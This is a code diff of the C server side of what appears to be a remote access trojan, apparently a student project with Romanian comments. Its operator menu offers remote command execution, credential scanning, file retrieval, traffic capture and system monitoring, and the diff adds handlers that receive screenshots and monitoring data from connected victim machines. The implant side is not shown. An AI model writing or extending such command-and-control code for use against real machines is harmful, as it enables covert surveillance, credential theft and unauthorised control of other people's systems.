@@ -12,7 +12,7 @@
 
 #define PORT 8080
 
-char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n 6. Monitor the system --- IN LUCRU\n 7.Screenshot the System --IVESCU AI DE FACUT ASTA \n 8. Return to clients menu ";
+char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n 6. Monitor the system \n 7.Screenshot the System \n 8. Return to clients menu ";
 
 typedef struct client
 {   
@@ -157,42 +157,70 @@ void get_system_info(int clientfd)
     }
 }
 
-void get_system_monitor(int clientfd)
+void screenshot_system(int clientfd)
 {
-    char monitor_data[MAXLINE * 10] = "";
-    char buffer[MAXLINE]; 
-    int total_bytes_read = 0;
-    int bytes_read; 
+    char buffer[MAXLINE];
+    ssize_t bytes_read;
+    int total_bytes = 0;
+    FILE *fp = fopen("screenshot.png", "wb");
+    
+    if (!fp) {
+        printf("Failed to create screenshot file\n");
+        return;
+    }
 
-    monitor_data[0] = '\0'; 
-
-    while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
-    {
-        buffer[bytes_read] = '\0'; 
-        char *end_marker = strstr(buffer, "<END_OF_DATA>");
-        if (end_marker != NULL) 
-        {
-            *end_marker = '\0';
-            strcat(monitor_data, buffer);
-            myWrite("System Monitoring Data from client: \n", STDOUT_FILENO);
-            myWrite(monitor_data, STDOUT_FILENO);
-            break; 
-        }   
-        strcat(monitor_data, buffer);
-        total_bytes_read += bytes_read;
-        if (total_bytes_read >= sizeof(monitor_data) - 1) 
-        {
-            myWrite("Buffer limit reached, cannot read further data.\n", STDOUT_FILENO);
+    printf("Receiving screenshot...\n");
+    
+    while ((bytes_read = recv(clientfd, buffer, sizeof(buffer), 0)) > 0) {
+        if (strstr(buffer, "<END_OF_DATA>")) {
             break;
         }
+        fwrite(buffer, 1, bytes_read, fp);
+        total_bytes += bytes_read;
+        printf("Received %d bytes\n", total_bytes);
     }
 
-    if (total_bytes_read == 0) 
-    {
-        myWrite("Failed to receive system monitoring data from client or connection closed.\n", STDOUT_FILENO);
-    }
+    fclose(fp);
+    printf("Screenshot saved as screenshot.png (%d bytes)\n", total_bytes);
 }
 
+void get_system_monitor(int clientfd) {
+    char buffer[BUFFER_SIZE] = {0};
+    ssize_t bytes_read;
+    size_t total = 0;
+    
+    struct timeval tv;
+    tv.tv_sec = 5; 
+    tv.tv_usec = 0;
+    setsockopt(clientfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
+    
+    printf("Waiting for system monitor data...\n");
+    
+    char ack[32] = {0};
+    bytes_read = recv(clientfd, ack, sizeof(ack), 0);
+    if (bytes_read <= 0 || !strstr(ack, "<ACK>")) {
+        printf("No acknowledgment from client\n");
+        return;
+    }
+    
+    printf("Received acknowledgment, waiting for data...\n");
+    
+    while ((bytes_read = recv(clientfd, buffer + total, BUFFER_SIZE - total - 1, 0)) > 0) {
+        total += bytes_read;
+        buffer[total] = '\0';
+        
+        char *end = strstr(buffer, "<END_OF_DATA>");
+        if (end) {
+            *end = '\0';
+            printf("Received system info:\n%s\n", buffer);
+            return;
+        }
+    }
+    
+    if (bytes_read <= 0) {
+        printf("Connection error or timeout\n");
+    }
+}
 void flushSTDIN()
 {
     int ch;
@@ -287,38 +315,42 @@ void* input_routine(void* args)
         {   
             //TODO: flush la buffer ul de stdin atunci cand vreau sa trimit o comanda
             case '1':
-            write(connfd,"1",1);
-            exec_on_client(connfd);
-            //flushSocketRead(connfd);
-            break;
+                write(connfd,"1",1);
+                exec_on_client(connfd);
+                //flushSocketRead(connfd);
+                break;
             case '2':
-            write(connfd,"2",1);
-            get_credentials(connfd);
-            //flushSocketRead(connfd);
-            break;
+                write(connfd,"2",1);
+                get_credentials(connfd);
+                //flushSocketRead(connfd);
+                break;
             case '3':
-            write(connfd, "3", 1);
-            get_system_info(connfd);
-            //flushSocketRead(connfd);
-            break;
+                write(connfd, "3", 1);
+                get_system_info(connfd);
+                //flushSocketRead(connfd);
+                break;
             case '4':
-            write(connfd,"4",1);
-            retrieve_file(connfd);
-            //flushSocketRead(connfd);
+                write(connfd,"4",1);
+                retrieve_file(connfd);
+                //flushSocketRead(connfd);
+                break;
             case '5':
-            write(connfd,"5",1);
-            capturetraffic(connfd);
-            //IN LUCRU
-            //case '6':
-            //write(connfd, "6", 1);
-            //get_system_monitor(connfd);
-            //break;
+                write(connfd,"5",1);
+                capturetraffic(connfd);
+                //flushSocketRead(connfd);
+                break;
+            case '6':
+                write(connfd, "6", 1);
+                get_system_monitor(connfd);
+                break;
+            case '7':
+                write(connfd, "7", 1);
+                screenshot_system(connfd);
+                break;
             default:
-            break;
-
+                break;
         }
     }
-    
 }
 
 void* client_interaction_thread(void* args) {
@@ -337,10 +369,7 @@ void* client_interaction_thread(void* args) {
         pthread_mutex_unlock(&client_mutex);
 
         printf("Interacting with client #%d\n", client_id);
-        //printf("Options:\n");
-        //printf(" 1. Execute command\n 2. Get credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n");
-        //printf("Enter option: ");
-        printf("%s\n",options);
+        printf("%s\n", options);
         printf("Enter option: ");
 
         char option;
@@ -367,9 +396,17 @@ void* client_interaction_thread(void* args) {
                 write(client_sock, "5", 1);
                 capturetraffic(client_sock);
                 break;
+            case '6':
+                write(client_sock, "6", 1);
+                get_system_monitor(client_sock);
+                break;
+            case '7':  
+                write(client_sock, "7", 1);
+                screenshot_system(client_sock);
+                break;
             case '8':
                 pthread_mutex_lock(&active_client_mutex);
-                active_client=-2;
+                active_client = -2;
                 pthread_mutex_unlock(&active_client_mutex);
                 break;
             default:
